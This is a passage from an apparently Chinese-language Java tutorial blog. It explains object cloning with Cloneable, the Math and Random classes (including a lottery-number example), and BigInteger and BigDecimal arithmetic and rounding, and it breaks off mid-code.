class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">clone</span><span class="params">( )</span> <span class="keyword">throws</span> CloneNotSupportedException;</span><br></pre></td></tr></table></figure><p>​    所有的类都会继承 Object 父类，所以所有的类都一定会有 clone() 方法，但是并不是所有的类都希望被克隆。</p><p>​    所以如果要想实现对象克隆，那么对象所在的类需要实现一个 Cloneable 接口，此接口并没有任何的方法提供，是因为它描述的是一种能力。</p><p>实现对象克隆错误案例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Member1</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Member1</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【 &quot;</span> + <span class="built_in">super</span>.toString() + <span class="string">&quot;】name=&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、age = &quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test27</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Member1</span> <span class="variable">memberA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Member1</span>(<span class="string">&quot;林强&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        memberA.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这是错误的代码，memberA.clone这里肯定是没办法克隆的，因为这是一个protected方法，修改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Member1</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Member1</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【 &quot;</span> + <span class="built_in">super</span>.toString() + <span class="string">&quot;】name=&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;、age = &quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.clone(); <span class="comment">//调用父类中提供的clone()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test27</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="type">Member1</span> <span class="variable">memberA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Member1</span>(<span class="string">&quot;林强&quot;</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="type">Member1</span> <span class="variable">memberB</span> <span class="operator">=</span> (Member1) memberA.clone();</span><br><span class="line">        System.out.println(memberA);</span><br><span class="line">        System.out.println(memberB);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果在开发之中不是非常特别的需求下，很少会出现有对象克隆的需求。</p><hr><h3 id="数字操作类"><a href="#数字操作类" class="headerlink" title="数字操作类"></a>数字操作类</h3><p>​    程序就是一个数学的处理过程，所以在 Java 语言本身也提供有相应的数字处理的类库支持。</p><h4 id="Math数学计算类"><a href="#Math数学计算类" class="headerlink" title="Math数学计算类"></a>Math数学计算类</h4><p>​    Math 类的主要功能是进行数学计算的操作类，提供有基础的计算公式。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073918.jpg"                      alt="image-20220920173743303"                >    </p><p>​    这个类的构造方法被私有化了但是不是单例设计模式，而且该类之中提供的所有方法都是 static 型的方法，即:这些方法都可以通过类名称直接调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Math数学计算类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test28</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Math.abs(-<span class="number">10.1</span>));</span><br><span class="line">        System.out.println(Math.max(<span class="number">10.2</span>, <span class="number">10.3</span>));</span><br><span class="line">        System.out.println(Math.log(<span class="number">5</span>));</span><br><span class="line">        System.out.println(Math.round(-<span class="number">15.5</span>));</span><br><span class="line">        System.out.println(Math.round(-<span class="number">15.6</span>));</span><br><span class="line">        System.out.println(Math.pow(<span class="number">10.2</span>, <span class="number">20.2</span>)); <span class="comment">//10的20次方</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073919.jpg"                      alt="image-20220920210629103"                ></p><p>​    虽然在 Math 类里面提供有四舍五入的处理方法,但是这个四舍五入字在进行处理的时候是直接将小数点后的所有位进行处理了，这样肯定不方便，那么现在最方便的做法是可以实现指定位数的保留。</p><p>范例：自定义的四舍五入的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Math数学计算类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">MathUtil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现四舍五入操作</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num   要进行四舍五入操作的数字</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> scale 四舍五入保留的小数位数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 四舍五入处理后的结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">round</span><span class="params">(<span class="type">double</span> num, <span class="type">int</span> scale)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.round(num * Math.pow(<span class="number">10</span>, scale)) / Math.pow(<span class="number">10</span>, scale);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test28</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(MathUtil.round(<span class="number">19.8673</span>, <span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Math 类里面提供的基本上都是基础的数学公式，需要的时候需要自己重新整合。</p><h4 id="Random随机数生成类"><a href="#Random随机数生成类" class="headerlink" title="Random随机数生成类"></a>Random随机数生成类</h4><p>​    java.util.Random 类的主要功能：java.util.Random 类的主要功能是产生随机数，这个类主要是依靠内部提供的方法来完成。</p><p>​    我们看看文档里面有一个重要的方法:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073920.jpg"                      alt="image-20220920214454928"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nextInt</span><span class="params">(<span class="type">int</span> bound)</span></span><br></pre></td></tr></table></figure><p>​    public int nextInt(int bouhd):产生一个不大于边界的<strong>随机正整数</strong>,带0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Random随机数生成类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test29</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">            System.out.print(rand.nextInt(<span class="number">10</span>) + <span class="string">&quot;、&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073922.jpg"                      alt="image-20220920215024588"                ></p><p>范例：随机生成36选7彩票号（不能出现0且不重复）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Random随机数生成类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test29</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> data[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">7</span>];<span class="comment">//开辟7个大小的空间</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">rand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">foot</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//操作data脚标</span></span><br><span class="line">        <span class="keyword">while</span> (foot &lt; <span class="number">7</span>) &#123; <span class="comment">//选择7个数字</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> rand.nextInt(<span class="number">37</span>); <span class="comment">//生成一个数字</span></span><br><span class="line">            <span class="keyword">if</span> (isUse(num, data)) &#123; <span class="comment">//判断是否可以使用</span></span><br><span class="line">                data[foot++] = num; <span class="comment">//保存数据</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(data);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> datum : data) &#123;</span><br><span class="line">            System.out.print(datum + <span class="string">&quot;、&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断传入的数字是否为日以及是否在数组之中存在</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num  要判断的数字</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> temp 已经存在的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果该数字不是0并且可以使用返回true, 否则false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isUse</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> temp[])</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; temp.length; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num == temp[x]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    以后这种随机的操作都可以利用Random来处理</p><h4 id="大数字处理"><a href="#大数字处理" class="headerlink" title="大数字处理"></a>大数字处理</h4><p>​    在进行数学计算的过程里面还有一个大数字的操作类，可以实现实现海量数字的计算（能提供的也只是基础计算)，现在假设一个数字很大，超过了double范围。那么这个时候没有一个数据类型可以保存下此类的内容，最早的时候只能够通过String保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">strA</span> <span class="operator">=</span> <span class="string">&quot;120&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">strB</span> <span class="operator">=</span> <span class="string">&quot;230&quot;</span>;</span><br></pre></td></tr></table></figure><p>​    如果现在要想进行加法计算，那么就需要逐位拆分，每一位自己计算，而后自己独立控制进位处理，那么这样的开发难度非常高，所以为了解决这类问题，提供有两个大数字的操作类：BigInteger、BigDecimal</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BigInteger</span> <span class="keyword">extends</span> <span class="title class_">Number</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;BigInteger&gt;</span><br></pre></td></tr></table></figure><p>​    我们可以发现是继承的Number类，那么我们可以完善下包装类</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073923.jpg"                      alt="image-20220920224017425"                ></p><p>​    之前分析了，当数字很大的时候只能够利用字符串描述数字操作，所以这一点可以观察两个大数字操作类的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BigInteger 类构造：<span class="keyword">public</span> <span class="title function_">BigInteger</span><span class="params">(String val)</span>;</span><br><span class="line">BigDecimal 类构造：<span class="keyword">public</span> <span class="title function_">BigDecimal</span><span class="params">(String val)</span>;</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073924.jpg"                      alt="image-20220920224941740"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73927.jpg"                      alt="image-20220920225033212"                ></p><p>范例：使用 BigInteger 进行四则运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;234234234234234234&quot;</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;23423423&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;加法操作：&quot;</span>+bigA.add(bigB));</span><br><span class="line">        System.out.println(<span class="string">&quot;减法操作：&quot;</span>+bigA.subtract(bigB));</span><br><span class="line">        System.out.println(<span class="string">&quot;乘法操作：&quot;</span>+bigA.multiply(bigB));</span><br><span class="line">        System.out.println(<span class="string">&quot;除法操作：&quot;</span>+bigA.divide(bigB));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073928.jpg"                      alt="image-20220920230208006"                ></p><p>​    需要注意的是，虽然提供有大数字类处理方法，但仍然需要考虑性能问题.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;234234234234234234&quot;</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;23423423&quot;</span>);</span><br><span class="line">        System.out.println(bigA.pow(Integer.MAX_VALUE)); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    此时的计算过程是非常缓慢的，所以任何的电脑都是有极限的。既然在进行数学除法的时候无法进行整除的处理，那么就可以使用其它的除法计算来求出余数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">求余：</span><br><span class="line">Public BigInteger[] divide <span class="title function_">AndRemainder</span><span class="params">(BigInteger val)</span></span><br><span class="line">数组第一个元素为商，第二个为余数</span><br></pre></td></tr></table></figure><p>范例：求余除法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;234234234234234234&quot;</span>);</span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">bigB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;23423423&quot;</span>);</span><br><span class="line">        BigInteger[] result = bigA.divideAndRemainder(bigB);</span><br><span class="line">        System.out.println(<span class="string">&quot;商：&quot;</span> + result[<span class="number">0</span>] + <span class="string">&quot;、余数：&quot;</span> + result[<span class="number">1</span>]);<span class="comment">//商：10000000180、余数：18018094</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果在计算时没有超过基本数据类型所包含的位数强烈不建议使用大数字处理类方法，因为性能很低。</p><p>​    BieDecimal 操作形式和 Bielnteger 是非常类似的，都有基础的数学支持。</p><p>范例：使用 BigDecimal  计算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大数据计算</span></span><br><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test30</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">bigA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;3254562624653745&quot;</span>);</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">bigB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;322344&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;加法计算：&quot;</span> + bigA.add(bigB));</span><br><span class="line">        BigDecimal[] result = bigA.divideAndRemainder(bigB);</span><br><span class="line">        System.out.println(<span class="string">&quot;除法计算，商：&quot;</span> + result[<span class="number">0</span>] + <span class="string">&quot;余数：&quot;</span> + result[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073930.jpg"                      alt="image-20220920231901500"                ></p><p>​    但是在使用 BigDecimal 的时候有一个数据进位问题，在这个类里面定义有如下的一个除法计算，可以看到在1.9之后就过期了，所以我们必须解决掉这个问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> BigDecimal <span class="title function_">divide</span><span class="params">(BigDecimal divisor,<span class="type">int</span> scale,RoundingMode roundingMode)</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073932.jpg"                      alt="image-20220920232340107"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">MathUtil1</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现四舍五入操作</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num   要进行四舍五入操作的数字</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> scale 四舍五入保留的小数位数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 四舍五入处理后的结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">round</span><span class="params">(<span class="type">double</span> num, <span class="type">int</span> scale)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(num).divide(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="number">1.0</span>),scale, 